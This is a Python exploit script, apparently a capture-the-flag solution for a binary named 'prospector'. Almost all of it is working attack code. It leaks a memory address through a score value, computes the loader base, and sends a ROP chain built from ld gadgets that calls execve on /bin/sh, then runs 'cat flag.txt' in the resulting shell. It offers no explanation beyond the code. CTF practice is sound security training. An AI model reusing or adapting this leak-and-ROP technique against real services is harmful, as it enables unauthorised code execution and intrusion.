#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from subprocess import check_output

context.log_level = 'debug'
exe = context.binary = ELF('./prospector_patched', checksec=False)
# exe = context.binary = ELF('./debug', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
# d2d_ida
brva 0x117E
brva 0x11D4
brva 0x1356
# brva 0x11AB
c
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.DOCKER:
        p = remote('localhost', 5000)
        # sleep(1)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def reverse_score(score: int) -> int:
    return 0x700000005000 | (score >> 1) << 16

# ==================== EXPLOIT ====================
p = start()

if args.GDB:
    if args.DOCKER:
        pid = int(check_output(['pidof', "-s", 'prospector']))
        gdb.attach(pid, gdbscript=gdbscript, exe=exe.path)
        pause()
    else:
        gdb.attach(p, gdbscript=gdbscript)
        pause()

sa(b'Nick: ', b'\x00' * 0x48 + p64(1))
sa(b'Color: ', p64(0))

ru(b'score: ')
leak_score = int(rl()[:-1].decode())

mmapped_address = reverse_score(leak_score)

if args.REMOTE:
    ld.address = mmapped_address + 0x3000 + 0x5000
else:
    ld.address = mmapped_address + 0x3000
info('mmaped address @ %#x', mmapped_address)
slog('ld base @ %#x', ld.address)

offset = 0x38
pop_rdi = ld.address + 0x3399
pop_rsi = ld.address + 0x5700
pop_rdx = ld.address + 0x217bb
pop_rax = ld.address + 0x15abb
syscall = ld.address + 0xb879

sla(b"Color: ", b'\x00' * 0x28 + p64(mmapped_address + 0x40) + p64(0) + flat(
    pop_rax,
    mmapped_address,
    pop_rdi, mmapped_address+0x40, 0,
    pop_rsi, 0, mmapped_address+0x40,
    pop_rax, 0x3b,
    pop_rdx, 0,
))

# sla(b"Color: ", b'/bin/busybox sh\x00' + p64(syscall))
sla(b"Color: ", b'/bin/sh\x00' + flat(syscall))

sl(b'cat flag.txt')

interactive(flag=False)
